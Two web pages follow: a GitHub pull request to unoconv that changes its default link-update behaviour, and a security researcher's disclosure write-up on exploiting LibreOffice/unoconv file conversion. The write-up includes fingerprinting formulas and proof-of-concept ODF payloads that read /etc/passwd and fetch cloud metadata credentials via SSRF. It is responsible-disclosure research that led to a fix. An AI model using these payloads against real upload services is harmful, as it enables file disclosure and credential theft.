=== Content from github.com_aeb64f9e_20250120_234858.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Funoconv%2Funoconv%2Fpull%2F510)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Funoconv%2Funoconv%2Fpull%2F510)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=unoconv%2Funoconv)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[unoconv](/unoconv)
/
**[unoconv](/unoconv/unoconv)**
Public

* [Notifications](/login?return_to=%2Funoconv%2Funoconv) You must be signed in to change notification settings
* [Fork
  376](/login?return_to=%2Funoconv%2Funoconv)
* [Star
   2.7k](/login?return_to=%2Funoconv%2Funoconv)

* [Code](/unoconv/unoconv)
* [Issues
  93](/unoconv/unoconv/issues)
* [Pull requests
  13](/unoconv/unoconv/pulls)
* [Actions](/unoconv/unoconv/actions)
* [Projects
  0](/unoconv/unoconv/projects)
* [Wiki](/unoconv/unoconv/wiki)
* [Security](/unoconv/unoconv/security)
* [Insights](/unoconv/unoconv/pulse)

Additional navigation options

* [Code](/unoconv/unoconv)
* [Issues](/unoconv/unoconv/issues)
* [Pull requests](/unoconv/unoconv/pulls)
* [Actions](/unoconv/unoconv/actions)
* [Projects](/unoconv/unoconv/projects)
* [Wiki](/unoconv/unoconv/wiki)
* [Security](/unoconv/unoconv/security)
* [Insights](/unoconv/unoconv/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Funoconv%2Funoconv%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Funoconv%2Funoconv%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# change default updateDocMode behavior and add new option to keep old behavior #510

 Merged

[regebro](/regebro)
merged 1 commit into
[unoconv:master](/unoconv/unoconv/tree/master "unoconv/unoconv:master")
from
[erbbysam:updateDocMode-option](/erbbysam/unoconv/tree/updateDocMode-option "erbbysam/unoconv:updateDocMode-option")

Sep 17, 2019

 Merged

# [change default updateDocMode behavior and add new option to keep old behavior](#top) #510

[regebro](/regebro)
merged 1 commit into
[unoconv:master](/unoconv/unoconv/tree/master "unoconv/unoconv:master")
from
[erbbysam:updateDocMode-option](/erbbysam/unoconv/tree/updateDocMode-option "erbbysam/unoconv:updateDocMode-option")

Sep 17, 2019

[Conversation
1](/unoconv/unoconv/pull/510)
[Commits
1](/unoconv/unoconv/pull/510/commits)
[Checks
0](/unoconv/unoconv/pull/510/checks)
[Files changed](/unoconv/unoconv/pull/510/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![erbbysam](https://avatars.githubusercontent.com/u/3687016?s=60&v=4)](/erbbysam)

Copy link

Contributor

### @erbbysam **[erbbysam](/erbbysam)** commented [Sep 15, 2019](#issue-493796072)

* Add new `--unsafe-quiet-update` option
* Change default behavior of unoconv to not update links

Sorry, something went wrong.

All reactions

[![@erbbysam](https://avatars.githubusercontent.com/u/3687016?s=40&v=4)](/erbbysam)

`[change default updateDocMode behavior and add new option to keep old …](/unoconv/unoconv/pull/510/commits/1a5ddf2b6eade65df380821b4a1d8f1b70ad765f "change default updateDocMode behavior and add new option to keep old behavior")`
 …

`[1a5ddf2](/unoconv/unoconv/pull/510/commits/1a5ddf2b6eade65df380821b4a1d8f1b70ad765f)`

```
…behavior
```

[![@regebro](https://avatars.githubusercontent.com/u/820596?s=80&u=fd6528eab6cfaa2eec62dac65c96c94fe0279797&v=4)](/regebro)

Copy link

Member

### **[regebro](/regebro)** commented [Sep 17, 2019](#issuecomment-532277852)

| Looks good, lets see if it passes tests after restarting the failed ones. |
| --- |

All reactions

Sorry, something went wrong.

[![regebro](https://avatars.githubusercontent.com/u/820596?s=60&v=4)](/regebro)

**[regebro](/regebro)**
approved these changes
[Sep 17, 2019](#pullrequestreview-289388760)

 [View reviewed changes](/unoconv/unoconv/pull/510/files/1a5ddf2b6eade65df380821b4a1d8f1b70ad765f)

[![@regebro](https://avatars.githubusercontent.com/u/820596?s=40&u=fd6528eab6cfaa2eec62dac65c96c94fe0279797&v=4)](/regebro)
[regebro](/regebro)
merged commit [`acfac59`](/unoconv/unoconv/commit/acfac594e643f9c44f1c3b8d6d8957190a4d76f2)
into
unoconv:master

[Sep 17, 2019](https://github.com/unoconv/unoconv/pull/510#event-2640520506)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Funoconv%2Funoconv%2Fpull%2F510)

Reviewers

[![@regebro](https://avatars.githubusercontent.com/u/820596?s=40&v=4)](/regebro) [regebro](/regebro)

regebro approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@erbbysam](https://avatars.githubusercontent.com/u/3687016?s=52&v=4)](/erbbysam) [![@regebro](https://avatars.githubusercontent.com/u/820596?s=52&v=4)](/regebro)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from buer.haus_4eb59141_20250120_234858.html ===


# [Brett Buerhaus](https://buer.haus/)

## Security research, vulnerability disclosures, and puzzle write-ups.

# Menu

[Skip to content](#content)

* [Home](https://buer.haus/)
* [Resume](https://buer.haus/resume/)

[Home](https://buer.haus/)A Tale of Exploitation in Spreadsheet File Conversions
# A Tale of Exploitation in Spreadsheet File Conversions

Author: [![image](https://buer.haus/wp-content/uploads/ios_homescreen_icon.png) Brett Buerhaus](https://twitter.com/bbuerhaus)
[October 18, 2019February 25, 2024](https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/) [bbuerhaus](https://buer.haus/author/bbuerhaus/)
[Security](https://buer.haus/category/security/)[bug bounty](https://buer.haus/tag/bug-bounty/), [lfr](https://buer.haus/tag/lfr/), [libreoffice](https://buer.haus/tag/libreoffice/), [research](https://buer.haus/tag/research/), [slack](https://buer.haus/tag/slack/), [ssrf](https://buer.haus/tag/ssrf/)

![](https://buer.haus/wp-content/uploads/2019/10/blog-post-logo.png)

---

Researchers:

* [Brett Buerhaus](https://twitter.com/bbuerhaus)
* [Cody Brocious (Daeken)](https://twitter.com/daeken)
* [Sam Erb (erbbysam)](https://twitter.com/erbbysam)
* [Olivier Beg (Smiegles)](https://twitter.com/smiegles)

---

# **Statement from Slack**

Slack would like to thank the researchers for their work to increase the security of the open source tool LibreOffice and their responsible disclosure to Slack. The security of file sharing is critically important to Slack and its users, and we worked with the research team to quickly implement a fix within 24 hours of receiving the report. Slack has confirmed that no customer data was accessed using this bug.

---

# **Intro**

In our attempt to fingerprint LibreOffice as a PDF rendering service, we identified multiple implementation vulnerabilities.

This writeup covers our efforts to fingerprint LibreOffice, LibreOffice file detection (and abuse) & misuse of the LibreOffice Python-UNO bridge.

The unintended misuse of the Python-UNO bridge by the popular package unoconv resulted in [CVE-2019-17400](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17400).

We believe our research here is not final, and encourage others to look into this area.

---

# **LibreOffice**

LibreOffice is an open-source fork of OpenOffice and with some google searches you can see there are [several critical CVEs](https://www.libreoffice.org/about-us/security/advisories/) for it from the past few weeks alone. LibreOffice's Github project has over 500k commits including code that has not been updated in many years. Many companies rely on using LibreOffice to export common document formats to HTML/PDF due to it allowing headless file conversions.

---

# **Fingerprinting the Spreadsheet Converter**

We used the following two methods to identify & fingerprint the document rendering service on multiple websites.

## The INFO Functions

Most spreadsheet specs, such as XLSX or ODS, provide you with the INFO functions to give you some information about the software or system that opened the spreadsheet.

An important observation to note here is that many websites we came across allowed for any LibreOffice support file type to be rendered, despite limiting file extensions client-side. This allowed us to test XLSX uploads. (more on this below)

[![](http://buer.haus/wp-content/uploads/2019/08/info.png)](http://buer.haus/wp-content/uploads/2019/08/info.png)

This is a useful identifier for a few reasons. The =INFO("osversion") function has a hard-coded value for OpenOffice/LibreOffice. OpenOffice and older versions of Libre return an error for INFO functions it does not support where LibreOffice after 2015 will display "#N/A". These small nuances provide the opportunity to create an XLSX file that can be used to get a better idea of what is processing the spreadsheets on the server.

Here are the fingerprints we ended up using:

Where cell c4 is **=INFO("DIRECTORY")**

| Label | Function |
| --- | --- |
| Is OpenOffice -or- Libre prior to 2015? | =IF(ISNUMBER(SEARCH("Err:502",C4)), "True", "False") |
| Is LibreOffice? | =IF(ISNUMBER(SEARCH("#",C4)), "True", "False") |
| Is Excel? | =IF(ISNUMBER(SEARCH("\",C4)), "True", "False") |

The check on OpenOffice is due to Libre's fork off of OpenOffice and eventually adding a resulting #N/A if you call an Excel INFO function that is not supported by OO/Libre. This was added in this commit: <https://github.com/LibreOffice/core/commit/db6a928a420868b2a80ba11c8d46151d16c13624>. So there is no guarantee, but it could be useful in determining whether you might want to try some older Libre CVEs or not.

Also worth noting is that recently Libre started to put a git hash as their version, so **INFO("release")** will help you find the exact versions of the software being used.

In addition to fingerprinting the app doing the conversion, it will also tell you a few other things. A useful one is the OSVERSION as it will tell you the operating system behind it (WIN, LINUX, SOLARIS) which could be useful recon data for tailoring exploits to the server. Another useful one specific to Excel is DIRECTORY which tells you the current working directory giving you a bit of a path disclosure or Windows username depending on the file location.

## PDF Metadata

Due to most of the applications using OpenOffice/LibreOffice to export XLSX/DOCX to PDF, if the application delivers you a raw PDF back from the conversion, it will likely contain metadata such as the version of LibreOffice being used.

This was the case with Slack, e.g.

```
https://files.slack.com/files-pri/[filehash]/download/asdf.odt_converted.pdf
```

Resulted in:

[![](http://buer.haus/wp-content/uploads/2019/08/pdf-metadata.png)](http://buer.haus/wp-content/uploads/2019/08/pdf-metadata.png)

---

# A Common Extension Pitfall

During our initial testing, we observed one website that would only render documents with an .xlsx extension. This website would then render the file using LibreOffice. We then created an ODS document and renamed it to use an XLSX extension instead. Poof! It was now returning the preview of the ODS document.

This is the entry point for exploitation of Open/LibreOffice conversions.

**Some applications are taking files you upload with XLSX or DOCX extensions and passing them into OpenOffice without performing strong file format validation or configuring filters safely.** When these files are handed off for conversion, the conversion flow used is determined by file contents rather than extension.

---

# LibreOffice/OpenOffice File Detection

**Please note that we do not have high confidence in our code analysis.**

When you pass files through **soffice** with the **--convert-to** and **--headless** arguments, it runs through a flow of code to determine what type of file you are passing into it. In our research, a vast majority of these are outputting to PDF which can be summarized with this flow:

* If no hard filter is specified, it tells it to guess the file format
* It checks the file extension of the file passed into it
* It checks a filter based on the file contents (such as magic headers)
* It has a list of file formats it supports and ranks them based on complexity. For example, it'll work on detecting if it's a complex XML format such as docbook before falling back to XML or HTML.
* If the extension and filter do not match, it falls back to relying solely on the filter guess

<https://github.com/LibreOffice/core/blob/master/desktop/source/app/dispatchwatcher.cxx#L595>

```
OUString aParam = aDispatchRequest.aPrinterName;
sal_Int32 nFilterIndex = aParam.indexOf( ':' );

bool bGuess = false;

if( nFilterIndex >= 0 ) {
    ...
} else {
    // Guess
    bGuess = true;
    aFilterExt = aParam.copy( 0, nPathIndex );
}
```

If a filter is not specified in the URI, it enables the guess file format flow.

```
if ( bGuess ) {
    ...
    aFilter = impl_GuessFilter( aOutFile, aDocService );
}

OUString impl_GuessFilter( const OUString& rUrlOut, const OUString& rDocService ) {
    std::shared_ptr pOutFilter = impl_getExportFilterFromUrl( rUrlOut, rDocService );
    ...
}

std::shared_ptr impl_getExportFilterFromUrl( const OUString& rUrl, const OUString& rFactory) {
    try {
        const Reference< XComponentContext > xContext( comphelper::getProcessComponentContext() );
        const Reference< document::XTypeDetection > xTypeDetector( xContext->getServiceManager()->createInstanceWithContext( "com.sun.star.document.TypeDetection", xContext ), UNO_QUERY_THROW );
        const OUString aTypeName( xTypeDetector->queryTypeByURL( rUrl ) );
```

At this point, it's relying on a set of configurable filters based on [com.sun.star.document.TypeDetection](https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/TypeDetection.html). These filters are used to determine file type, which can be roughly summarized as checking for magic header bytes or hard-coded strings in the file contents. That means if you are taking in word docs or spreadsheets and exporting to PDF, it will completely negate the docx or xlsx extensions and guess what the file format if it does not detect the xlsx or docx file headers.

Here is an example of Encapsulated PostScript (EPFS):

* The filter: <https://github.com/LibreOffice/core/blob/master/filter/source/config/fragments/types/eps_Encapsulated_PostScript.xcu>
* The check: <https://github.com/LibreOffice/core/blob/master/vcl/source/filter/GraphicFormatDetector.cxx#L322>

```
bool GraphicFormatDetector::checkEPS()
{
    if ((mnFirstLong == 0xC5D0D3C6)
        || (ImplSearchEntry(maFirstBytes.data(), reinterpret_cast("%!PS-Adobe"),
                            10, 10)
            && ImplSearchEntry(&maFirstBytes[15], reinterpret_cast("EPS"), 3, 3)))
    {
        msDetectedFormat = "EPS";
        return true;
    }
    return false;
}
```

As you can see you cannot just throw `PS-Adobe` in a text file and convert it. It is also checking if `EPS` follows after the PS-Adobe header. Once you determine how the file detection is taking place for specific file formats, you can start to exploit that file format if the conversion taking place allows it.

---

## File Formats Supported By LibreOffice

The file formats supported by LibreOffice is around 100. There are far too many to cover, so I'll leave the link to the Wiki table here:

<https://en.wikipedia.org/wiki/LibreOffice#Supported_file_formats>

You'll need to click the "Show" link to expand the table.

---

# Ghost(script) in the Excel

One of the first things that jumped out to us in the supported file formats is that LibreOffice supports EPFS which means PostScript/Ghostscript. There have been some fun exploits in Ghostscript the past few years and it's also one of the only file formats supported (that we could identify) that allows some raw scripting to interact with files or execute commands.

Using a Ghostscript payload, we were able to achieve file read and write.

The code for this payload can be found here:

* <https://gist.github.com/ziot/fb96e97baae59e3539ac3cdacbd09430>

Credits to [Cody Brocious (daeken)](https://twitter.com/daeken) for getting the Ghostscript payload working.

One thing we learned about LibreOffice is that although EPFS files were being processed by LibreOffice, there was no guarantee that it would lead to Ghostscript. This is due to a hierarchy system of EPFS parsing:

```
pstoedit, convert (a part of ImageMagick), and GhostScript (gs or gswin32c) are tried in that order on all platforms. The first one that is available will be used to render the preview
```

More information on that flow here:

* <https://github.com/LibreOffice/core/blob/master/filter/source/graphicfilter/ieps/ieps.cxx>

But, EPFS just hands off postscript to other applications, there is no guarantee that there is a binary on the system that will handle the postscript you pass into it. In these cases, you need to find an alternative route for exploitation.

---

# Slack, OLE Objects, and Text Sections

With the LibreOffice fingerprint spreadsheet file, we started to check other websites that may also use LibreOffice in a similar way. We accidentally discovered that Slack is using LibreOffice (while sharing files using Slack...). Our LFI Ghostscript payload did not work, so we had to find a different exploit chain with Libre.

Below we go over the specific details of the OLE Object xLinks and Text Section exploits we used to read local file contents and capture AWS credentials.

---

# LFD/SSRF - Remote OLE Object xLinking

This is akin to the [=WEBSERVICE LFD/SSRF vulnerability (CVE-2018-6871)](https://www.exploit-db.com/exploits/44022). In LibreOffice documents you are able to embed OLE Objects inside of the documents. This also supports remote objects that update when the document is opened. Although LibreOffice docs contain some features that may allow this, such as floating frames (conversions of iframes), you may not get them to render when converted to a PDF document.

OLE Objects in LibreOffice work by fetching the contents of the remote URL and displaying the contents inside of a frame. The OLE objects are embedded in the **content.xml** of the LibreOffice files. **By default, these x-href links will not update on conversion.** In fact, in OpenOffice/LibreOffice, most of the time you need to enable link updates manually after you open the document. This brings us to the popular Universal Office Converter (unoconv), but more on that later in the blog post.

As long as x-href updates are enabled, you will be able to fetch arbitrary contents. This can be seen by creating the following PoC:

### PoC Steps

1. Create a new spreadsheet in LibreOffice
2. Insert -> object -> ole object -> create from file
3. Checkbox "link to file"
4. Enter a url to an actual file (libre will fail on a 404)
5. Save the odt file
6. Open the odt file with zip tool like 7zip
7. Modify content.xml, replacing the url with "file:///etc/passwd".
   * \* find: `<draw:object xlink:href="https://[your server]/[your file]" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>`
   * \* replace: `<draw:object xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>`
8. Replace the content.xml in the odt file with your newly edited one
9. Rename file to test.odt.xlsx
10. Upload to a vulnerable web server that processes the document.
11. ---> You can see the contents of /etc/passwd.

If you view content.xml in the OpenOffice file format (zip), the OLE object works like the following:

```
<draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph" svg:width="6.6925in" svg:height="1.1791in" draw:z-index="0"><draw:object xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>
```

The xlink:href is fetched when the document is converted based on the xlink:actuate **onLoad** trigger.

However, there is a problem with this vector. OLE Objects with remote links update when the document is opened and this resets the formatting. The default formatting will only allow you to view 2-3 lines of text. There may be a way to circumvent this, but after many failed attempts we decided to look for an alternative.

[![](http://buer.haus/wp-content/uploads/2019/08/etc-ole.png)](http://buer.haus/wp-content/uploads/2019/08/etc-ole.png)

---

# SSRF and LFD with Text Sections

After reading the documentation, we discovered that OFD files have a features that support the xlink hrefs as well.

Source: <http://www.datypic.com/sc/odf/a-xlink_href.html>

One of these features is called **[text sections](http://www.datypic.com/sc/odf/e-text_section-source.html).**From here we were able to construct a payload that allowed arbitrary read in a default styling that displayed the full contents. This feature also allows the same file:// access as OLE objects..

```
<office:text>
    <text:section text:name="string">
        <text:section-source xlink:href="http://169.254.169.254/latest/meta-data/ xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
    </text:section>
</office:text>
```

From here we got what we needed:

[![](http://buer.haus/wp-content/uploads/2019/08/aws-keys.png)](http://buer.haus/wp-content/uploads/2019/08/aws-keys.png)

This exploit ended up working on another program, but it is one that we are unable to disclose. So text-sections are a good test to try if Ghostscript fails, but remember that it relies on link updates to be enabled whether manually in commandline or via a library that explicitly forces links to update.

---

# Universal Office Converter aka the unoconv pyuno rabbit-hole

Project Repository: <https://github.com/unoconv/unoconv>

```
Description: Universal Office Converter (unoconv) is a command line tool to convert any document format that LibreOffice can import to any document format that LibreOffice can export. It makes use of the LibreOffice’s UNO bindings for non-interactive conversion of documents.
```

In the case of Slack and a few others, the problem was their usage of libraries that used unoconv. Although at its core it is just a service that sits on top of Libre and OpenOffice.

After reviewing the unoconv code, we realized that it's using a bridge in order to access OpenOffice API's in Python. This took us down even further into the rabbit-hole. Welcome to the [PyUNO Bridge](https://wiki.openoffice.org/wiki/PyUNO_bridge).

Info:

* <https://wiki.openoffice.org/wiki/PyUNO_bridge>
* <https://github.com/LibreOffice/core/blob/master/pyuno/>

The vulnerability in x-href links ended up being caused by unoconv's silent updating of external links.

<https://github.com/unoconv/unoconv/blob/master/unoconv#L972>

```
            inputprops = UnoProps(Hidden=True, ReadOnly=True, UpdateDocMode=QUIET_UPDATE)
```

<https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/MediaDescriptor.html#UpdateDocMode>

If you look into the UpdateDocMode, you'll see that QUIET\_UPDATE specifies the following: "Update document if it does not require a dialog. Otherwise do not update. For example a link to a database can require a dialog to get password for an update.". Updating external links has a button you press as a security concern, but it is not considered a required dialog option. Thus unoconv will silently update all external links during the conversion process.

Unoconv also has an “updateLinks” phase as well which would also update the document with remote links: <https://github.com/unoconv/unoconv/blob/release-0.8/unoconv#L986> (**warning: old branch**)

We worked a maintainer for unoconv to modify the default behavior to a safer option: <https://github.com/unoconv/unoconv/pull/510>

This has been integrated into unoconv 0.9.

---

# OpenOffice Macro CVEs

You might be pointing out that LibreOffice has a lot of CVEs, some of them that automatically execute basic or Python code via the macro system. These have been found a couple of times, even quite recent to our research with [CVE 2019-9848](https://www.andreafortuna.org/2019/07/27/cve-2019-9848-unpatched-flaw-in-libreoffice-allows-malicious-code-execution/).

It's important to note that our research and attacks are purely taking place in the conversion process of a headless OpenOffice or Libre binary. The binary we are focusing on is **soffice** with the **--headless** launch argument & **uonconv/PyUNO**.

In our testing we found that these exploits did not work during conversion or when a preview of the document is generated. We don't know the specifics of this, but it looks like event handlers or macros are not executed directly when LibreOffice is running in --headless or --invisible mode.

---

# Closing Thoughts

To recap our findings on LibreOffice -- EPSF rendering can hit Ghostscript in uncommon circumstances & it is not safe to silently update links in a document you do not trust.

LibreOffice has had many CVEs in the past, some of them very similar to what we are writing about in this blog post. The concept of an LFD, SSRF, or even RCE via macros is nothing that has not been seen before. The takeaway is that there are many websites relying on libraries that are complex and filled with many nuances that may get lost or not seen when implementing them into applications.

Some companies are openly parsing libre documents directly and others are making mistakes passing certain extensions into libre on accident. However, some of them are relying on sandboxing and/or jails to prevent meaningful exploitation even if you execute code in that environment.

We would like to encourage any developer reading this to sandbox document parsing / PDF rendering as much as possible. We believe the risk here can be considered comparable to image processing with ImageMagick (see [ImageTragick](https://imagetragick.com/)).

Going forward, it would be interesting to see more research on:

* Oasis file spec
* LibreOffice/OpenOffice file detection and parsing
* Implementation of PyUNO Bridge and OpenOffice API calls
* Any vulnerability in the common code path used by the --headless conversion process would likely impact every use of LibreOffice online

# Post navigation

[← H1-5411 CTF Write-up by erbbysam and ziot](https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/) [JosieBellini’s Yours Truly Puzzle Walkthrough →](https://buer.haus/2020/03/03/josiebellinis-yours-truly-puzzle-walkthrough/)

Search for:

# Twitter Feed

[Tweets by @bbuerhaus](https://twitter.com/bbuerhaus)

# Tags

[1o57](https://buer.haus/tag/1o57/ "2 topics")
[admin](https://buer.haus/tag/admin/ "1 topic")
[airbnb](https://buer.haus/tag/airbnb/ "4 topics")
[anime](https://buer.haus/tag/anime/ "1 topic")
[application security](https://buer.haus/tag/application-security/ "1 topic")
[appsec](https://buer.haus/tag/appsec/ "1 topic")
[badge\_challenge](https://buer.haus/tag/badge_challenge/ "2 topics")
[bounty](https://buer.haus/tag/bounty/ "1 topic")
[bounty programs](https://buer.haus/tag/bounty-programs/ "2 topics")
[bug bounty](https://buer.haus/tag/bug-bounty/ "6 topics")
[burp](https://buer.haus/tag/burp/ "2 topics")
[coin\_artist](https://buer.haus/tag/coin_artist/ "2 topics")
[cross-site request forgery](https://buer.haus/tag/cross-site-request-forgery/ "1 topic")
[cross-site scripting](https://buer.haus/tag/cross-site-scripting/ "2 topics")
[crypto](https://buer.haus/tag/crypto/ "7 topics")
[CSAW](https://buer.haus/tag/csaw/ "1 topic")
[csrf](https://buer.haus/tag/csrf/ "1 topic")
[css](https://buer.haus/tag/css/ "1 topic")
[CTF](https://buer.haus/tag/ctf/ "18 topics")
[defcon](https://buer.haus/tag/defcon/ "3 topics")
[defcon22](https://buer.haus/tag/defcon22/ "1 topic")
[detection](https://buer.haus/tag/detection/ "2 topics")
[facebook](https://buer.haus/tag/facebook/ "2 topics")
[flickr](https://buer.haus/tag/flickr/ "1 topic")
[google](https://buer.haus/tag/google/ "14 topics")
[hackerone](https://buer.haus/tag/hackerone/ "6 topics")
[javascript](https://buer.haus/tag/javascript/ "1 topic")
[JavaScript Reversing](https://buer.haus/tag/javascript-reversing/ "2 topics")
[lfi](https://buer.haus/tag/lfi/ "1 topic")
[lfr](https://buer.haus/tag/lfr/ "2 topics")
[mobile](https://buer.haus/tag/mobile/ "1 topic")
[montecrypto](https://buer.haus/tag/montecrypto/ "1 topic")
[potatosec](https://buer.haus/tag/potatosec/ "1 topic")
[puzzle](https://buer.haus/tag/puzzle/ "7 topics")
[python](https://buer.haus/tag/python/ "1 topic")
[regex](https://buer.haus/tag/regex/ "1 topic")
[research](https://buer.haus/tag/research/ "7 topics")
[security](https://buer.haus/tag/security/ "9 topics")
[sqli](https://buer.haus/tag/sqli/ "2 topics")
[sql injection](https://buer.haus/tag/sql-injection/ "2 topics")
[ssrf](https://buer.haus/tag/ssrf/ "4 topics")
[web](https://buer.haus/tag/web/ "3 topics")
[whitehat](https://buer.haus/tag/whitehat/ "2 topics")
[xss](https://buer.haus/tag/xss/ "7 topics")
[yahoo](https://buer.haus/tag/yahoo/ "2 topics")

# Recent Posts

* [Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild](https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/)
* [Reversing and Tooling a Signed Request Hash in Obfuscated JavaScript](https://buer.haus/2024/01/16/reversing-and-tooling-a-signed-request-hash-in-obfuscated-javascript/)
* [BT’s Metaversal Album Treasure Hunt Solution](https://buer.haus/2021/10/12/bts-metaversal-album-treasure-hunt-solution/)
* [Cr0wnGhoul 1ETH Puzzle: You’ve Got Mail Write-up](https://buer.haus/2021/05/13/cr0wnghoul-1eth-puzzle-youve-got-mail-write-up/)
* [coin\_artist 50k Follower Puzzle – Write-up](https://buer.haus/2021/05/05/coin_artist-50k-follower-puzzle-write-up/)

# Archives

* [February 2024](https://buer.haus/2024/02/)
* [January 2024](https://buer.haus/2024/01/)
* [October 2021](https://buer.haus/2021/10/)
* [May 2021](https://buer.haus/2021/05/)
* [September 2020](https://buer.haus/2020/09/)
* [July 2020](https://buer.haus/2020/07/)
* [June 2020](https://buer.haus/2020/06/)
* [March 2020](https://buer.haus/2020/03/)
* [October 2019](https://buer.haus/2019/10/)
* [October 2018](https://buer.haus/2018/10/)
* [April 2018](https://buer.haus/2018/04/)
* [June 2017](https://buer.haus/2017/06/)
* [March 2017](https://buer.haus/2017/03/)
* [August 2016](https://buer.haus/2016/08/)
* [May 2016](https://buer.haus/2016/05/)
* [April 2016](https://buer.haus/2016/04/)
* [September 2015](https://buer.haus/2015/09/)
